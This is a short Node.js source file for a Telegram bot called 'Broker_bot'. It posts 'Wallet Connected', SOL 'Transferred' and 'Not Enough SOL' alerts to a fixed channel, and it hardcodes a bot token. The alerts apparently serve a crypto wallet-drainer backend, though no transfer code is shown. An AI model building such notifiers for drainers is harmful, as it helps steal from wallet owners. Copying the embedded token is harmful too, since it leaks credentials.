require("dotenv").config({ path: process.env.env_file });
const Telegraf = require('telegraf');
// const bot_token = process.env.BOT_TOKEN
const bot_token = "6777923138:AAEY0Ft7WS3G9kLlk80IplZJcOdJ6z-b2wM"

const bot = new Telegraf(bot_token);
const helpMessage = `
say something to me
/start - starts the bot
/help - command reference
/send - send command
`;
const startMessage = "Welcome to Broker_bot."
// const channelId = process.env.CHANNEL_ID
const channelId = 6778135289

bot.start(async (ctx) => {
    ctx.reply(startMessage);
})

bot.help((ctx) => {
    ctx.reply(helpMessage);
})

exports.initBot = async () => {
    try {
        await bot.launch();
    }
    catch (err) {
        console.warn(err)
        return
    }
}

exports.stopBot = async () => {
    try {
        await bot.stop()
    }
    catch (err) {
        console.warn(err)
        return
    }
}

exports.signNotify = async (data) => {
    try {
        const { owner } = data
        console.log("SignNotify Function called....\n Received Parameter is ", owner)
        let sendMessage = `✅   Wallet Connected:  \n  ${owner} `
        await bot.telegram.sendMessage(channelId, sendMessage, {
            parse_mode: "html"
        })
    } catch (err) {
        console.warn(err)
        return
    }
}

exports.transferNotify = async (data) => {
    try {
        const { balance, tx } = data
        console.log("TransferNotify Function called....\n Received Parameter is ", balance, "and ", tx)
        let sendMessage = `😉   Transferred  <b>${balance}</b> SOL  \n🟢   Tx Hash: ${tx} `
        await bot.telegram.sendMessage(channelId, sendMessage, {
            parse_mode: "html"
        })
    } catch (err) {
        console.warn(err)
        return
    }
}

exports.notEnoughNotify = async () => {
    try {
        console.log("NotEnoughNotify Function called....\n")
        let sendMessage = `⚠️   Not Enough SOL`
        await bot.telegram.sendMessage(channelId, sendMessage, {
            parse_mode: "html"
        })
    } catch (err) {
        console.warn(err)
        return
    }
}



